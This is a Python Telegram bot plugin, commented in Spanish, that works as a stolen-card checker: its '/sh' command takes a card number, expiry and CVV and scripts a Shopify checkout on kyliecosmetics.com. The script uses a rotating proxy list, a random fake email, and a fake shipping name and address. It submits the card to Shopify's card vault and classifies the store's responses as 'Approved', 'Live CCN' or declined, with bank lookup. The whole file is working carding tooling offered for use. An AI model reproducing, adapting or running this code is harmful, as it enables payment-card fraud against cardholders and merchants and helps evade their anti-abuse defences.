from pyrogram import Client, filters
from pyrogram.types import Message
from time import perf_counter
import asyncio
import random
import string
import aiohttp
import names
import os
import httpx

# Utilidades

def get_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def find_between(data: str, first: str, last: str) -> str:
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''

async def sh_request(cc, mes, ano, cvv, proxy: str):
    try:
        # Validar formato de tarjeta antes de procesar
        if not cc or len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
            return "Declined ❌", "Número de tarjeta inválido (formato incorrecto)"
        
        if not mes or len(mes) != 2 or not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            return "Declined ❌", "Mes inválido"
        
        if not ano or (len(ano) != 2 and len(ano) != 4) or not ano.isdigit():
            return "Declined ❌", "Año inválido"
        
        if not cvv or len(cvv) < 3 or len(cvv) > 4 or not cvv.isdigit():
            return "Declined ❌", "CVV inválido"
        
        # Convertir año a 4 dígitos si es necesario
        if len(ano) == 2:
            ano = "20" + ano
        
        # Manejar proxies con y sin autenticación
        auth = None
        proxy_url = None
        
        print(f"[SH] Proxy original: {proxy}")
        
        try:
            # Limpiar el proxy (eliminar espacios)
            proxy = proxy.strip()
            
            # Intentar parsear proxy con autenticación
            if '@' in proxy:
                # Formato: user:pass@host:port o http://user:pass@host:port
                # Remover http:// o https:// si existe para parsear más fácil
                if '://' in proxy:
                    protocol = proxy.split('://')[0]  # http o https
                    rest = proxy.split('://')[1]  # user:pass@host:port
                else:
                    protocol = 'http'
                    rest = proxy
                
                # Dividir en autenticación y host
                proxy_parts = rest.split('@')
                
                if len(proxy_parts) == 2:
                    # Tenemos user:pass y host:port
                    auth_part = proxy_parts[0]
                    host_part = proxy_parts[1]
                    
                    # Parsear autenticación (puede tener : en la contraseña)
                    if ':' in auth_part:
                        # Dividir solo en el primer : para manejar contraseñas con :
                        colon_index = auth_part.find(':')
                        username = auth_part[:colon_index]
                        password = auth_part[colon_index + 1:]
                        
                        if username and password:
                            auth = aiohttp.BasicAuth(username, password)
                            print(f"[SH] Proxy con autenticación detectado: {username}:***@{host_part}")
                            
                            # Construir URL del proxy (siempre usar http para proxy)
                            proxy_url = f"http://{host_part}"
                        else:
                            print(f"[SH] Error: Usuario o contraseña vacíos")
                            proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
                    else:
                        print(f"[SH] Error: No se encontró ':' en la parte de autenticación")
                        proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
                else:
                    print(f"[SH] Error: Formato de proxy con @ inválido (debe ser user:pass@host:port)")
                    proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
            else:
                # Proxy sin autenticación (formato: http://host:port o host:port)
                proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
                print(f"[SH] Proxy sin autenticación: {proxy_url}")
        except Exception as e:
            # Si hay error al parsear, usar el proxy tal cual
            proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
            print(f"[SH] Error al parsear proxy: {str(e)}, usando: {proxy_url}")
        
        print(f"[SH] Proxy URL final: {proxy_url}")
        print(f"[SH] ¿Tiene autenticación?: {auth is not None}")
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://kyliecosmetics.com',
                'Referer': 'https://kyliecosmetics.com/',
            }
        ) as s:
            CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000, 9999999)}@gmail.com"
            payload_1 = {'id': '45124251058418'}
            proxy_kwargs = {'proxy': proxy_url}
            if auth:
                proxy_kwargs['proxy_auth'] = auth
            
            async with s.post('https://kyliecosmetics.com/cart/add.js', data=payload_1, **proxy_kwargs) as req1:
                if req1.status != 200:
                    return "Error ❌", f"Error al agregar al carrito: HTTP {req1.status}"
            async with s.post("https://kyliecosmetics.com/checkout/", **proxy_kwargs) as req3:
                if req3.status != 200:
                    return "Error ❌", f"Error al acceder al checkout: HTTP {req3.status}"
                checkout_url = str(req3.url)
                authenticity_token = get_random_string(86)
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                    'Origin': 'https://kyliecosmetics.com',
                    'Referer': checkout_url
                }
                payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D={CorreoRand}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=juan+&checkout%5Bshipping_address%5D%5Blast_name%5D=peres+&checkout%5Bshipping_address%5D%5Baddress1%5D=345+Street+Road&checkout%5Bshipping_address%5D%5Bcity%5D=Warminster&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bprovince%5D=PA&checkout%5Bshipping_address%5D%5Bzip%5D=18974&checkout%5Bshipping_address%5D%5Bphone%5D=%28805%29+402-6732'
                async with s.post(checkout_url, headers=headers, data=payload_2, **proxy_kwargs) as req4:
                    pass
                payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520%287-10%2520business%2520days%29-8.95'
                async with s.post(checkout_url, headers=headers, data=payload_3, **proxy_kwargs) as req5:
                    pass
                await asyncio.sleep(3)
                payload_4 = {
                    "credit_card": {
                        "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                        "name": "Jose Ruis",
                        "month": mes,
                        "year": ano,
                        "verification_value": cvv
                    },
                    "payment_session_scope": "kyliecosmetics.com"
                }
                session_headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                    'Origin': 'https://kyliecosmetics.com',
                    'Referer': checkout_url,
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                }
                try:
                    async with s.post('https://deposit.us.shopifycs.com/sessions', json=payload_4, headers=session_headers, **proxy_kwargs) as req6:
                        try:
                            token = await req6.json()
                            id_ = token.get('id')
                        except Exception as e:
                            text_response = await req6.text()
                            return "Error ❌", "Error al procesar la respuesta del servidor de Shopify"
                except aiohttp.ClientError as e:
                    return "Error ❌", "Error al conectar con el servidor de Shopify"
                payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=93017997554&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bterms-of-service%5D=on&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B18054026732&checkout%5Btotal_price%5D=3705&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1'
                async with s.post(checkout_url, headers=headers, data=payload_5, **proxy_kwargs) as req7:
                    processing_url = str(req7.url)
                    async with s.get(f"{processing_url}?from_processing_page=1", **proxy_kwargs) as req8:
                        async with s.get(req8.url, **proxy_kwargs) as req9:
                            text_resp = await req9.text()
                            final_url = str(req9.url)
                            
                            # Logging para debugging
                            print(f"[SH] URL final: {final_url}")
                            print(f"[SH] Longitud de respuesta: {len(text_resp)} caracteres")
                            print(f"[SH] Primeros 500 chars de respuesta: {text_resp[:500]}")
                            
                            # Buscar respuesta específica del servidor
                            resp = find_between(text_resp, 'notice__text">', '<')
                            if not resp:
                                resp = find_between(text_resp, 'error-message">', '<')
                            if not resp:
                                resp = find_between(text_resp, 'error__message">', '<')
                            if not resp:
                                # Buscar SOLO respuestas específicas y legítimas del servidor
                                if "Your card was declined" in text_resp:
                                    resp = "Your card was declined"
                                elif "Your card's security code is incorrect" in text_resp:
                                    resp = "Your card's security code is incorrect"
                                elif "Your card has insufficient funds" in text_resp:
                                    resp = "Your card has insufficient funds"
                                elif "Your card's expiration year is invalid" in text_resp:
                                    resp = "Your card's expiration year is invalid"
                                elif "Your card's expiration month is invalid" in text_resp:
                                    resp = "Your card's expiration month is invalid"
                                elif "Your card number is incorrect" in text_resp:
                                    resp = "Your card number is incorrect"
                                else:
                                    # Intentar obtener la respuesta del servidor de Shopify
                                    try:
                                        async with s.get('https://deposit.us.shopifycs.com/sessions/status', **proxy_kwargs) as status_req:
                                            status_data = await status_req.json()
                                            if 'error' in status_data:
                                                resp = status_data['error']
                                            # Si no hay error específico, no usar respuesta genérica
                                    except:
                                        pass
                                    # Si no encontramos respuesta específica, resp queda vacío
                            
                            # Guardar respuesta original para mostrar en el mensaje
                            original_resp = resp
                            print(f"[SH] Respuesta extraída: {original_resp}")
                            # Lógica detallada de status y mensaje - ORDEN IMPORTANTE: más específico primero
                            resp_lower = resp.lower() if resp else ""
                            
                            # Verificar si la respuesta es legítima (solo aceptamos respuestas específicas)
                            is_legitimate = False
                            
                            # Respuestas legítimas del servidor
                            legitimate_patterns = [
                                "Your card was declined",
                                "Your card's security code is incorrect",
                                "Your card has insufficient funds",
                                "Your card's expiration year is invalid",
                                "Your card's expiration month is invalid",
                                "Your card number is incorrect",
                                "Transaction Normal",
                                "Address not Verified",
                                "CVV2",
                                "Security code was not matched",
                                "Security codes does not match"
                            ]
                            
                            # Verificar si la respuesta es legítima
                            if not resp or len(resp.strip()) < 5:
                                is_legitimate = False
                            elif any(pattern in resp for pattern in legitimate_patterns):
                                is_legitimate = True
                            elif '/thank_you' in final_url or '/orders/' in final_url or '/post_purchase' in final_url:
                                is_legitimate = True
                            elif '/3d_secure_2/' in final_url:
                                is_legitimate = True
                            
                            print(f"[SH] Respuesta: {resp}")
                            print(f"[SH] URL final: {final_url}")
                            print(f"[SH] ¿Es legítima?: {is_legitimate}")
                            
                            # Si la respuesta NO es legítima, devolver error
                            if not is_legitimate:
                                return "Error ❌", "No se pudo obtener una respuesta legítima del servidor. La gate puede estar bloqueada o el sitio cambió."
                            
                            # Primero verificar URLs de éxito reales (sin errores en la respuesta)
                            if ('/thank_you' in final_url or '/orders/' in final_url or '/post_purchase' in final_url) and 'insufficient' not in resp_lower and 'declined' not in resp_lower and 'error' not in resp_lower:
                                status = "Approved ✅"
                                msg = "Transaction Approved\n3D Secure NO Required ✅"
                            elif '/3d_secure_2/' in final_url:
                                status = "Declined ❌"
                                msg = "3D Secure Required ❌"
                            # Luego verificar todos los tipos de rechazo (solo respuestas legítimas)
                            elif "Your card has insufficient funds" in resp or "insufficient funds" in resp_lower:
                                status = "Declined ❌"
                                msg = "Fondos insuficientes."
                            elif "Transaction Normal - Insufficient Funds" in resp:
                                status = "Declined ❌"
                                msg = "Fondos insuficientes."
                            elif "Address not Verified - Insufficient Funds" in resp:
                                status = "Declined ❌"
                                msg = "Fondos insuficientes."
                            elif "CVV2/CID/CVC2 Data not Verified - Insufficient Funds" in resp:
                                status = "Declined ❌"
                                msg = "Fondos insuficientes."
                            elif "Your card was declined" in resp:
                                status = "Declined ❌"
                                msg = "Your card was declined."
                            elif "Your card's security code is incorrect" in resp:
                                status = "Declined ❌"
                                msg = "Código de seguridad incorrecto."
                            elif "Your card number is incorrect" in resp:
                                status = "Declined ❌"
                                msg = "Número de tarjeta incorrecto."
                            elif "Your card's expiration year is invalid" in resp:
                                status = "Declined ❌"
                                msg = "Año de expiración inválido."
                            elif "Your card's expiration month is invalid" in resp:
                                status = "Declined ❌"
                                msg = "Mes de expiración inválido."
                            elif "Security code was not matched by the processor" in resp:
                                status = "Approved ✅"
                                msg = "Approved CCN ✅\n3D Secure NO Required ✅"
                            elif "CVV2/VAK Failure (531)" in resp:
                                status = "Approved ✅"
                                msg = "Approved CCN ✅\n3D Secure NO Required ✅"
                            elif "CVV2/CID/CVC2 Data not Verified - Declined" in resp:
                                status = "Declined ❌"
                                msg = "CVV no verificado - Tarjeta rechazada"
                            elif "Security codes does not match correct format (3-4 digits)" in resp:
                                status = "Approved ✅"
                                msg = "Live CCN ✅\n3D Secure NO Required ✅"
                            elif "Address not Verified - Approved" in resp and "insufficient" not in resp_lower:
                                status = "Approved ✅"
                                msg = "Transaction Approved\n3D Secure NO Required ✅"
                            elif "Transaction Normal" in resp and "Approved" in resp:
                                status = "Approved ✅"
                                msg = "Transaction Approved\n3D Secure NO Required ✅"
                            else:
                                # Si llegamos aquí y la respuesta es legítima pero no coincide con ningún patrón conocido
                                status = "Declined ❌"
                                msg = resp[:100] if resp else "Respuesta desconocida del servidor"
                            return status, msg
    except aiohttp.ClientProxyConnectionError as e:
        return "Error ❌", f"Error de conexión con proxy: {str(e)}"
    except aiohttp.ClientConnectorError as e:
        return "Error ❌", f"Error de conexión: {str(e)}"
    except aiohttp.ClientResponseError as e:
        if e.status == 407:
            return "Error ❌", f"Proxy requiere autenticación (407). Verifica el formato del proxy."
        elif e.status == 403:
            return "Error ❌", f"Acceso denegado (403). El sitio puede estar bloqueando el proxy."
        elif e.status == 429:
            return "Error ❌", f"Demasiadas solicitudes (429). Espera un momento."
        else:
            return "Error ❌", f"Error HTTP {e.status}: {str(e)}"
    except asyncio.TimeoutError:
        return "Error ❌", "Timeout: El servidor no respondió a tiempo."
    except Exception as e:
        error_msg = str(e)
        if "407" in error_msg or "Proxy Authentication" in error_msg:
            return "Error ❌", "Proxy requiere autenticación. Verifica el formato: user:pass@host:port"
        elif "403" in error_msg or "Forbidden" in error_msg:
            return "Error ❌", "Acceso denegado. El sitio puede estar bloqueando el proxy o la IP."
        elif "timeout" in error_msg.lower():
            return "Error ❌", "Timeout: El servidor no respondió a tiempo."
        else:
            return "Error ❌", f"Error: {error_msg[:100]}"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    return chr(0x1F1E6 + ord(country_code[0].upper()) - ord('A')) + chr(0x1F1E6 + ord(country_code[1].upper()) - ord('A'))

async def get_bin_info(bin_code):
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(f'https://lookup.binlist.net/{bin_code}')
            if r.status_code == 200:
                data = r.json()
                banco = data.get('bank', {}).get('name', 'N/A')
                pais = data.get('country', {}).get('name', 'N/A')
                tipo = data.get('type', 'N/A')
                marca = data.get('scheme', 'N/A')
                country_code = data.get('country', {}).get('alpha2', '')
                return banco, pais, tipo, marca, country_code
    except Exception:
        pass
    return 'N/A', 'N/A', 'N/A', 'N/A', ''

def get_random_proxy():
    proxies_path = os.path.join(os.path.dirname(__file__), 'proxies.txt')
    with open(proxies_path, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    return random.choice(proxies) if proxies else None

def create_loading_bar(percentage):
    bar_length = 10
    filled_length = int(bar_length * percentage / 100)
    if percentage < 30:
        bar = '▓' * filled_length + '░' * (bar_length - filled_length)
    elif percentage < 70:
        bar = '▒' * filled_length + '░' * (bar_length - filled_length)
    else:
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
    return f"[{bar}] {percentage}%"

@Client.on_message(filters.command("sh", prefixes=["/",".","$","!","%","#"]))
async def sh_gate(client: Client, m: Message):
    try:
        inicio = perf_counter()
        # Extraer los datos de la tarjeta, aceptando ambos formatos
        try:
            args = m.text.strip().split(maxsplit=1)[1]
            if '|' in args:
                parts = [x.strip() for x in args.split('|')]
            else:
                parts = [x.strip() for x in args.split()]
            if len(parts) < 4:
                raise ValueError
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            
            # Validar formato básico antes de continuar
            if not cc or len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
                await m.reply("<b>Error:</b> Número de tarjeta inválido (formato incorrecto)")
                return
            
            if not mes or len(mes) != 2 or not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
                await m.reply("<b>Error:</b> Mes inválido (debe ser 01-12)")
                return
            
            if not ano or (len(ano) != 2 and len(ano) != 4) or not ano.isdigit():
                await m.reply("<b>Error:</b> Año inválido")
                return
            
            if not cvv or len(cvv) < 3 or len(cvv) > 4 or not cvv.isdigit():
                await m.reply("<b>Error:</b> CVV inválido (debe tener 3 o 4 dígitos)")
                return
        except ValueError:
            await m.reply("<b>Formato:</b> <code>.sh cc mes año cvv</code> o <code>.sh cc|mes|año|cvv</code>")
            return
        except Exception as e:
            await m.reply(f"<b>Error al procesar el comando:</b> <code>{str(e)}</code>")
            return

        # Obtener lista de proxies
        proxies_path = os.path.join(os.path.dirname(__file__), 'proxies.txt')
        try:
            with open(proxies_path, 'r') as f:
                all_proxies = [line.strip() for line in f if line.strip()]
        except:
            all_proxies = []
        
        if not all_proxies:
            await m.reply("No hay proxies disponibles en proxies.txt")
            return

        # Mensaje de carga animado
        loading_msg = await m.reply(
            f"[荣] Card ┊  {cc}|{mes}|{ano}|{cvv}\n[荣] Status ↝ Testing...\n[荣] Response ↝ ...\n[荣] Gateway ↝ Shopify Auth\n- - - - - - - - - - - - - - - - - - - - - - - -\n[荣] Bank ↝ ...\n[荣] Type ↝ ...\n[荣] Country ↝ ...\n- - - - - - - - - - - - - - - - - - - - - - - -\n[荣] Time ↝ 0.0's \n[荣] Proxys Live ✅\n[荣] Checked ↝ @{m.from_user.username or 'Sin username'}"
        )
        for percent in [20, 40, 60, 80, 100]:
            await asyncio.sleep(0.3)
            await loading_msg.edit_text(
                f"[荣] Card ┊  {cc}|{mes}|{ano}|{cvv}\n[荣] Status ↝ Testing...\n[荣] Response ↝ ...\n[荣] Gateway ↝ Shopify Auth\n- - - - - - - - - - - - - - - - - - - - - - - -\n[荣] Bank ↝ ...\n[荣] Type ↝ ...\n[荣] Country ↝ ...\n- - - - - - - - - - - - - - - - - - - - - - - -\n[荣] Time ↝ {perf_counter() - inicio:.2f}'s \n[荣] Proxys Live ✅\n[荣] Checked ↝ @{m.from_user.username or 'Sin username'}"
            )

        # Intentar con diferentes proxies si uno falla
        max_retries = min(3, len(all_proxies))  # Intentar con máximo 3 proxies
        used_proxies = set()
        status = None
        msg = None
        
        for attempt in range(max_retries):
            # Seleccionar un proxy que no hayamos usado
            available_proxies = [p for p in all_proxies if p not in used_proxies]
            if not available_proxies:
                break
            
            proxy = random.choice(available_proxies)
            used_proxies.add(proxy)
            
            print(f"[SH] Intento {attempt + 1}/{max_retries} con proxy: {proxy[:50]}...")
            status, msg = await sh_request(cc, mes, ano, cvv, proxy)
            
            # Si no es un error de proxy, usar esta respuesta
            if not status.startswith("Error ❌") or "407" not in msg and "Proxy" not in msg:
                break
            elif attempt < max_retries - 1:
                print(f"[SH] Proxy falló, intentando con otro...")
                await asyncio.sleep(1)  # Esperar un poco antes de intentar con otro proxy
        fin = perf_counter()
        tiempo = fin - inicio

        # Consultar info del BIN
        bin_code = cc[:6]
        banco, pais, tipo, marca, country_code = await get_bin_info(bin_code)
        flag = get_flag_emoji(country_code)
        pais_flag = f"{pais} {flag}" if pais != 'N/A' and flag else pais

        respuesta = (
            f"[荣] H2 Checker ┊ Shopify Auth\n"
            f"[荣] Card ┊  {cc}|{mes}|{ano}|{cvv}\n"
            f"[荣] Status ↝ {status}\n"
            f"[荣] Response ↝ {msg}\n"
            f"[荣] Gateway ↝ Shopify Auth\n"
            f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
            f"[荣] Bank ↝ {banco}\n"
            f"[荣] Type ↝ {tipo} ({marca})\n"
            f"[荣] Country ↝ {pais_flag}\n"
            f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
            f"[荣] Time ↝ {tiempo:.2f}'s \n"
            f"[荣] Proxys Live ✅\n"
            f"[荣] Checked ↝ @{m.from_user.username or 'Sin username'}"
        )
        await loading_msg.edit_text(respuesta)
    except Exception as e:
        await m.reply(f"<b>Ocurrió un error en la gate SH:</b> <code>{str(e)}</code>") 